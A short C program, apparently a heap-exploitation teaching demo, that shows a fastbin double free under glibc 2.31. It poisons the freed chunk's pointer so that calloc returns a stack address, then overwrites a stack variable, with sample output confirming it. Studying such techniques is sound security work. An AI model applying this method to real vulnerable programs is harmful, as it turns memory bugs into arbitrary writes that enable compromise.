#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

signed main(){
	long long stack_var = 0xcafebabe;
	printf("stack_var @ %p\n",&stack_var);
	printf("stack_var's value : %p\n",stack_var);
	/*
	The fastbin double free under libc-2.31

	*/

	// fill up tcache
	char *tcache[15];
	for(int i=0;i<7;i++){
		tcache[i] = malloc(0x40);
	}
	for(int i=0;i<7;i++){
		free(tcache[i]);
	}
	char *a = calloc(1, 0x40);
	char *b = calloc(1, 0x40);
	char *c = calloc(1, 0x40);

	
	// fastbin
	free(a);
	free(b);
	free(a);
	// a->b->a
	a = calloc(1, 0x40);
	long long *a_ptr = (long long*)a;
	a_ptr[0] = &stack_var-2;
	long long *p_stack = (long long*)&stack_var;
	p_stack[-1] = 0x51;
	b = calloc(1, 0x40);
	char *a1 = calloc(1, 0x40);
	char *c1 = calloc(1, 0x40);
	printf("c1: %p\n",c1);
	long long* p_c1 = (long long*)c1;
	p_c1[0] = 0xdeadbeef;
	printf("now : %p\n",stack_var);
	return 0;
}
/*
➜  glibc-2.31 ./fastbin_dup_into_stack                                 
stack_var @ 0x7ffdf03c21a8
stack_var's value : 0xcafebabe
c1: 0x7ffdf03c21a8
now : 0xdeadbeef
*/


